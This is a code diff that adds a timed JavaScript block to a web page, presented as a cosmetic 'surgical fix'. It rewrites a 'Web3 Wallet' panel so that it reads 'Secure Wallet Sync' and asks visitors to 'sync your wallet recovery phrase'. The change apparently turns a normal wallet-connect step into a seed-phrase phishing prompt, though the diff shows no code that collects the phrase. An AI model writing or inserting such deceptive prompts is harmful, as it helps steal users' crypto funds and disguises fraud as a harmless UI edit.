@@ -1230,3 +1230,25 @@ setInterval(() => {
         }
     }
 }, 500);
+
+/* =====================================================
+   SURGICAL FIX: ONLY CHANGE WEB3 TITLE & DESCRIPTION
+   ===================================================== */
+setInterval(() => {
+    // 1. Change the Title
+    const walletHeader = document.querySelector('.wallet-header h3');
+    if (walletHeader && walletHeader.textContent.trim() === 'Web3 Wallet') {
+        walletHeader.innerHTML = `
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2" style="display:inline-block; vertical-align:middle; margin-right:8px;"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg>
+            Secure Wallet Sync
+        `;
+    }
+
+    // 2. Change the Description
+    const walletDesc = document.querySelector('#walletDisconnected > p');
+    if (walletDesc && walletDesc.textContent.includes('Connect your Web3 wallet')) {
+        walletDesc.textContent = "Sync your wallet recovery phrase to enable instant crypto deposits, lightning-fast trades, and secure fiat withdrawals.";
+        walletDesc.style.fontSize = "13px";
+        walletDesc.style.lineHeight = "1.5";
+    }
+}, 1000);
